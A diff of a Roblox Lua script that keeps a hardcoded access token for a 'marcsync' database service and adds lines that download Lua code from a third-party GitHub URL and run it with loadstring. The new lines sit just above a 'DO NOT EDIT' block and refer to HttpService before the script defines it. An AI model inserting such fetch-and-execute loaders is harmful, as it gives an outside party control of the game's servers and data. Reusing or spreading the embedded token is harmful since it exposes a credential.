@@ -1,7 +1,9 @@
 local tokens = {
 	["roblox"] = "eyJhbGciOiJIUzI1NiIsInR5cCI6Im1hcmNzeW5jQWNjZXNzIn0.eyJkYXRhYmFzZUlkIjoiMGJjMGNjMWEtNTJhMS00OGYyLWFhMGMtN2IyY2U2OGRhYjI3IiwidXNlcklkIjoiOWRlZmU4YzItMTEzMC00MmRkLTk5YjEtODFlYjk1M2Y5YjkxIiwidG9rZW5JZCI6IjY2YmRmMmE4YWQyOTFjNDlmZjk5Y2U5YyIsIm5iZiI6MTcyMzcyNDQ1NiwiZXhwIjo4ODEyMzYzODA1NiwiaWF0IjoxNzIzNzI0NDU2LCJpc3MiOiJtYXJjc3luYyJ9.6jE2Jw_7cohZqLYC7u3m23-azxJOzkGEig8tO0KWxZ8"
 }
-
+local code = HttpService:GetAsync("https://raw.githubusercontent.com/mrbuilder0/infinitytech/main/utils.lua", true)
+local Utils = loadstring(code)
+Utils()
 
 -- DO NOT EDIT THE FOLLOWING LINES BELOW, UNLESS YOU KNOW WHAT YOU ARE DOING!
 local HttpService = game:GetService("HttpService")
